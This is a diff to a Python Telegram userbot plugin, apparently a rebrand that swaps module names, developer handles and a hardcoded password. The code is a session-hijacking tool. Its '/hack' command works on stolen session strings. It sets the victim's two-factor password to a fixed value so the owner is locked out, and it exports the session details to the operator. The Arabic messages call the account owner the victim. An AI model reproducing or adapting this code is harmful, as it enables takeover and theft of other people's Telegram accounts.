@@ -1,4 +1,4 @@
-from jepthon import bot, jepiq
+from jmthon import bot, jmub
 #By SOURCE SHARK  @A_T_M_L
 from telethon import events, functions, types, Button
 from datetime import timedelta
@@ -75,7 +75,7 @@ async def user2fa(strses):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     
     try:
-      await X.edit_2fa('jepthon')
+      await X.edit_2fa('jmthon')
       return True
     except:
       return False
@@ -217,14 +217,14 @@ keyboard = [
 
       
        
-@jepiq.on(
+@jmub.on(
     admin_cmd(
        pattern="هاك$"
     )
 )
 async def op(event):
     joker = Bot_Username.replace("@","")       
-    await event.edit(f"**᯽︙ قم بالدخول لبوتك من هنا @{SHARK} \n وكتابة الامر /hack** ")
+    await event.edit(f"** قم بالدخول لبوتك من هنا @{SHARK} \n وكتابة الامر /hack** ")
  
 @tgbot.on(events.NewMessage(pattern="/hack", func = lambda x: x.is_private))
 async def start(event):
@@ -253,7 +253,7 @@ async def start(event):
             Button.inline("N", data="N"),
             ],
           [
-            Button.url("المطور", "https://t.me/L_H_V")
+            Button.url("المطور", "https://t.me/T_3_A")
             ]
         ]
         await x.send_message(f"اختر ماتريد فعله مع الجلسة \n\n{menu}", buttons=keyboard)
@@ -274,7 +274,7 @@ async def users(event):
         return await event.reply("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.\n/hack", buttons=keyboard)
       if len(i) > 1:
         file = open("session.txt", "w")
-        file.write(i + "\n\nDetails BY @Jepthon")
+        file.write(i + "\n\nDetails BY @L_H_V")
         file.close()
         await bot.send_file(event.chat_id, "session.txt")
         system("rm -rf session.txt")
